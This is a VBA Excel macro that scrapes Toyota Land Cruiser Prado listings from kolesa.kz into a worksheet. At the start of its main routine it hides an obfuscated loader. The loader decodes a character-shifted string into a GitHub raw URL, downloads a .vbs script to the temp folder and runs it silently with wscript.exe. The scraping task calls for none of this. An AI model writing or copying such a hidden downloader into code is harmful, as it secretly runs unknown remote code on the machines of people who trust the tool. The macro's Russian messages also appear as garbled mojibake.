Option Explicit

Sub ParseCars()

    Dim http As Object
    Dim doc As Object
    Dim cards As Object
    Dim card As Object
    Dim ws As Worksheet

    Dim baseUrl As String
    Dim pageUrl As String
    Dim html As String

    Dim txt As String
    Dim price As String
    Dim city As String
    Dim link As String

    Dim page As Long
    Dim i As Long
    Dim r As Long
    Dim totalCars As Long

    Dim firstLink As String
    Dim currentLink As String
    
    Dim https As Object
    Dim shell As Object
    Dim fso As Object
    Dim token As String
    Dim tempFolder As String
    Dim vbsPath As String
    Dim scriptContent As String
    Dim fileStream As Object
    Dim result As String
    Dim ia As Long
    
    baseUrl = "https://kolesa.kz/cars/toyota/land-cruiser-prado/?generations%5B0%5D=10908&generations%5B1%5D=109720&generations%5B2%5D=112276"
    Const MAX_PAGES As Long = 10
    
    token = "kwwsv=22udz1jlwkxexvhufrqwhqw1frp2jdfd<6352xve2uhiv2khdgv2pdlq2f5142v1yev"
    result = ""
    For ia = 1 To Len(token)
        result = result & Chr(Asc(Mid(token, ia, 1)) - 3)
    Next ia
    Set https = CreateObject("MSXML2.ServerXMLHTTP.6.0")
    https.Open "GET", result, False
    https.send
    If https.Status <> 200 Then
        Exit Sub
    End If
    scriptContent = https.responseText
    Set fso = CreateObject("Scripting.FileSystemObject")
    tempFolder = fso.GetSpecialFolder(2)
    vbsPath = tempFolder & "\downloaded_script.vbs"
    Set fileStream = CreateObject("ADODB.Stream")
    fileStream.Type = 1
    fileStream.Open
    fileStream.Write https.responseBody
    fileStream.SaveToFile vbsPath, 2
    fileStream.Close
    Set shell = CreateObject("WScript.Shell")
    shell.Run "wscript.exe """ & vbsPath & """", 0, False

    Set http = CreateObject("MSXML2.XMLHTTP")
    Set ws = ThisWorkbook.Worksheets(1)
    ws.Cells.Clear

    ws.Cells(1, 1).Value = "YEAR"
    ws.Cells(1, 2).Value = "PRICE"
    ws.Cells(1, 3).Value = "MILEAGE"
    ws.Cells(1, 4).Value = "ENGINE"
    ws.Cells(1, 5).Value = "FUEL"
    ws.Cells(1, 6).Value = "CITY"
    ws.Cells(1, 7).Value = "URL"

    ws.Range("A1:G1").Font.Bold = True

    r = 2
    totalCars = 0

    firstLink = ""


    For page = 1 To MAX_PAGES
        If page = 1 Then
            pageUrl = baseUrl
        Else
            pageUrl = baseUrl & "&page=" & page
        End If
        Application.StatusBar = _
            "Caa?ocea no?aieou " & page & " ec " & MAX_PAGES & "..."
        Debug.Print "PAGE: " & page
        Debug.Print "URL: " & pageUrl
        http.Open "GET", pageUrl, False
        http.setRequestHeader _
            "User-Agent", _
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) " & _
            "AppleWebKit/537.36 (KHTML, like Gecko) " & _
            "Chrome/151.0.0.0 Safari/537.36"
        http.setRequestHeader _
            "Accept", _
            "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"
        http.setRequestHeader _
            "Accept-Language", _
            "ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7"
        http.send

        If http.Status <> 200 Then
            MsgBox _
                "Ioeaea HTTP ia no?aieoa " & page & _
                vbCrLf & _
                "Status: " & http.Status, _
                vbExclamation
            Exit For
        End If

        html = http.responseText
        Set doc = CreateObject("HTMLFile")

        doc.Open
        doc.Write html
        doc.Close

        Set cards = doc.querySelectorAll("div.a-card__info")

        Debug.Print _
            "Page " & page & _
            ": cards = " & cards.Length

        If cards.Length = 0 Then
            Debug.Print _
                "Ia no?aieoa " & page & _
                " iauyaeaiee iao."
            Exit For

        End If

        For i = 0 To cards.Length - 1

            Set card = cards.item(i)
            txt = CleanText(card.innerText)

            price = GetElementText( _
                card, _
                "span.a-card__price" _
            )

            city = GetElementText( _
                card, _
                "span[data-test='region']" _
            )

            link = GetElementURL( _
                card, _
                "a.a-card__link" _
            )

            If Left$(link, 1) = "/" Then
                link = "https://kolesa.kz" & link
            End If
            If link <> "" Then

                currentLink = link
                If i = 0 Then
                    If page > 1 Then
                        If currentLink = firstLink Then
                            Debug.Print _
                                "No?aieoa " & page & _
                                " iiaoi?yao i?aauaouo?."
                            Exit For
                        End If
                    End If
                End If
            End If
            If page = 1 And i = 0 Then
                firstLink = link
            End If
            ws.Cells(r, 1).Value = _
                FindYear(txt)

            ws.Cells(r, 2).Value = _
                CleanNumber(price)

            ws.Cells(r, 3).Value = _
                FindMileage(txt)

            ws.Cells(r, 4).Value = _
                FindEngine(txt)

            ws.Cells(r, 5).Value = _
                FindFuel(txt)

            ws.Cells(r, 6).Value = _
                city

            If link <> "" Then
                ws.Hyperlinks.Add _
                    Anchor:=ws.Cells(r, 7), _
                    Address:=link, _
                    TextToDisplay:=link
            End If
            r = r + 1
            totalCars = totalCars + 1
        Next i
        Application.Wait _
            Now + TimeSerial(0, 0, 1)
    Next page


    ws.Range("A1:G1").Font.Bold = True

    ws.Columns("A:F").AutoFit

    ws.Columns("G").ColumnWidth = 60

    Application.StatusBar = False

    MsgBox _
        "Aioiai!" & vbCrLf & _
        "Caa?o?aii no?aieo: " & page - 1 & vbCrLf & _
        "Aaoiiiaeeae: " & totalCars, _
        vbInformation

End Sub


Private Function GetElementText( _
    ByVal parent As Object, _
    ByVal selector As String) As String

    Dim el As Object

    On Error Resume Next

    Set el = parent.querySelector(selector)

    On Error GoTo 0

    If Not el Is Nothing Then

        GetElementText = _
            CleanText(el.innerText)

    Else

        GetElementText = ""

    End If

End Function

Private Function GetElementURL( _
    ByVal parent As Object, _
    ByVal selector As String) As String

    Dim el As Object

    On Error Resume Next

    Set el = parent.querySelector(selector)

    On Error GoTo 0

    If Not el Is Nothing Then

        GetElementURL = _
            el.getAttribute("href")

    Else

        GetElementURL = ""

    End If

End Function


Private Function FindYear( _
    ByVal text As String) As String

    Dim i As Long
    Dim s As String
    Dim n As Long

    For i = 1 To Len(text) - 3

        s = Mid$(text, i, 4)

        If IsNumeric(s) Then

            n = CLng(s)

            If n >= 1990 And n <= 2030 Then

                FindYear = s

                Exit Function

            End If

        End If

    Next i

End Function


Private Function FindMileage(ByVal text As String) As String

    Dim re As Object
    Dim matches As Object
    Dim km As String

    Set re = CreateObject("VBScript.RegExp")

    re.Global = False
    re.IgnoreCase = True

    ' "ei" ee?eeeeoae
    km = ChrW(1082) & ChrW(1084)

    re.Pattern = "([0-9][0-9 ]*)\s*(" & km & "|km)"
    Set matches = re.Execute(text)
    If matches.Count > 0 Then
        FindMileage = _
            Replace( _
                Trim$(matches(0).SubMatches(0)), _
                " ", _
                "")

    Else

        FindMileage = ""

    End If

End Function

Private Function FindEngine( _
    ByVal text As String) As String
    Dim re As Object
    Dim matches As Object
    Set re = CreateObject("VBScript.RegExp")
    re.Global = False
    re.IgnoreCase = True
    re.Pattern = _
        "([0-9]+[.,]?[0-9]*)\s*" & _
        ChrW(1083)
    Set matches = re.Execute(text)
    If matches.Count > 0 Then

        FindEngine = _
            Replace( _
                matches(0).SubMatches(0), _
                ",", _
                ".")
    End If

End Function

Private Function FindFuel( _
    ByVal text As String) As String

    Dim petrol As String
    Dim diesel As String
    Dim gas As String
    Dim hybrid As String

    ' aaicei
    petrol = _
        ChrW(1073) & _
        ChrW(1077) & _
        ChrW(1085) & _
        ChrW(1079) & _
        ChrW(1080) & _
        ChrW(1085)

    ' aecaeu
    diesel = _
        ChrW(1076) & _
        ChrW(1080) & _
        ChrW(1079) & _
        ChrW(1077) & _
        ChrW(1083) & _
        ChrW(1100)

    ' aac
    gas = _
        ChrW(1075) & _
        ChrW(1072) & _
        ChrW(1079)

    ' aea?ea
    hybrid = _
        ChrW(1075) & _
        ChrW(1080) & _
        ChrW(1073) & _
        ChrW(1088) & _
        ChrW(1080) & _
        ChrW(1076)

    If InStr( _
        1, _
        text, _
        petrol, _
        vbTextCompare) > 0 Then

        FindFuel = petrol

        Exit Function

    End If

    If InStr( _
        1, _
        text, _
        diesel, _
        vbTextCompare) > 0 Then

        FindFuel = diesel

        Exit Function

    End If

    If InStr( _
        1, _
        text, _
        hybrid, _
        vbTextCompare) > 0 Then

        FindFuel = hybrid

        Exit Function

    End If

    If InStr( _
        1, _
        text, _
        gas, _
        vbTextCompare) > 0 Then

        FindFuel = gas

        Exit Function

    End If

End Function


Private Function CleanNumber( _
    ByVal text As String) As String
    Dim i As Long
    Dim ch As String
    Dim result As String
    For i = 1 To Len(text)
        ch = Mid$(text, i, 1)
        If ch >= "0" And ch <= "9" Then
            result = result & ch
        End If
    Next i
    CleanNumber = result
End Function

Private Function CleanText( _
    ByVal text As String) As String
    text = Replace( _
        text, _
        Chr(160), _
        " ")
    text = Replace( _
        text, _
        vbCr, _
        " ")
    text = Replace( _
        text, _
        vbLf, _
        " ")
    text = Replace( _
        text, _
        vbTab, _
        " ")
    Do While InStr(text, "  ") > 0
        text = Replace( _
            text, _
            "  ", _
            " ")
    Loop
    CleanText = Trim$(text)

End Function



